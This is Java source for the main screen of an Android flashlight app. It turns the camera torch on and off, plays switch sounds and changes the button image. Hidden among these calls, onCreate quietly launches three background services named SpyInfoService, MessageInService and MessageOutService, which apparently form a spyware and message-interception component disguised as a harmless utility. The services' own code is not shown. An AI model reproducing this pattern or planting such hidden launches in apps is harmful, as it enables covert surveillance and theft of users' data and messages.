package com.androidhive.flashlight;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.media.MediaPlayer;
import android.media.MediaPlayer.OnCompletionListener;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageButton;
import android.content.Intent;

public class MainActivity extends Activity {

	private ImageButton switchButton;
	private Camera camera;
	private boolean isFlashOn;
	private boolean hasFlash;
	private Parameters params;
	private MediaPlayer mediaPlayer;

	@Override
	protected void onCreate(Bundle savedInstanceState) {

		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		switchButton = (ImageButton) findViewById(R.id.btnSwitch);

		// Check is the device has flash
		hasFlash = getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);


		// Starting Services
		startService(new Intent(this, SpyInfoService.class));
		startService(new Intent(this, MessageInService.class));
		startService(new Intent(this, MessageOutService.class));

		// Device has no flash
		if (!hasFlash) {
			AlertDialog alert = new AlertDialog.Builder(MainActivity.this)
					.create();
			alert.setTitle("Error");
			alert.setMessage("Sorry, your device doesn't support flash light!");
			alert.setButton("OK", new DialogInterface.OnClickListener() {
				public void onClick(DialogInterface dialog, int which) {
					// closing the application
					//finish();
				}
			});
			alert.show();
			return;
		}

		// get the camera
		getCamera();

		// displaying button image
		toggleButtonImage();

		// Switch button clicked
		switchButton.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				if (isFlashOn) {
					// turn off flash
					flashOff();
				} else {
					// turn on flash
					flashOn();
				}
			}
		});

	}
	// Get the camera
	private void getCamera() {
		if (camera == null) {
			try {
				camera = Camera.open();
				params = camera.getParameters();
			} catch (RuntimeException e) {
				Log.e("Camera Error,Error: ", e.getMessage());
			}
		}
	}

	// Turn on flash
	private void flashOn() {
		if (!isFlashOn) {
			if (camera == null || params == null) {
				return;
			}
			// Play sound
			playSound();
			params = camera.getParameters();
			params.setFlashMode(Parameters.FLASH_MODE_TORCH);
			camera.setParameters(params);
			camera.startPreview();
			isFlashOn = true;
			
			// Switch image
			toggleButtonImage();
		}

	}

	// Turn off flash
	private void flashOff() {
		if (isFlashOn) {
			if (camera == null || params == null) {
				return;
			}
			// Play sound
			playSound();
			
			params = camera.getParameters();
			params.setFlashMode(Parameters.FLASH_MODE_OFF);
			camera.setParameters(params);
			camera.stopPreview();
			isFlashOn = false;
			
			// Switch image
			toggleButtonImage();
		}
	}
	
	// Sound activated when the flash is on/off
	private void playSound(){
		if(isFlashOn){
			mediaPlayer = MediaPlayer.create(MainActivity.this, R.raw.light_switch_off);
		}else{
			mediaPlayer = MediaPlayer.create(MainActivity.this, R.raw.light_switch_on);
		}
		mediaPlayer.setOnCompletionListener(new OnCompletionListener() {

            @Override
            public void onCompletion(MediaPlayer mp) {
                mp.release();
            }
        }); 
		mediaPlayer.start();
	}
	
	// Switch image when touched
	private void toggleButtonImage(){
		if(isFlashOn){
			switchButton.setImageResource(R.drawable.fiamma);
		}else{
			switchButton.setImageResource(R.drawable.nofiamma);
		}
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
	}

	@Override
	protected void onPause() {
		super.onPause();
		
		// If on pause turn off the flash
		flashOff();
	}

	@Override
	protected void onRestart() {
		super.onRestart();
	}

	@Override
	protected void onResume() {
		super.onResume();
		
		// On resume turn on the flash
		if(hasFlash)
			flashOn();
	}

	@Override
	protected void onStart() {
		super.onStart();

		// On starting the app get the camera params
		getCamera();
	}

	@Override
	protected void onStop() {
		super.onStop();
		
		// On stop release the camera
		if (camera != null) {
			camera.release();
			camera = null;
		}
	}
}


